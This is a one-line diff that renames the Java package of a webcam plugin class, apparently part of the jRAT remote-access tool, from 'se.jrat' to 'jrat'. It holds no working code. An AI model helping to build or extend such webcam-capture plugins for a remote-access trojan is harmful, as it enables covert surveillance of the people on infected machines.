@@ -1,1 +1,1 @@
-se.jrat.plugin.webcam.client.WebcamPlugin
+jrat.plugin.webcam.client.WebcamPlugin
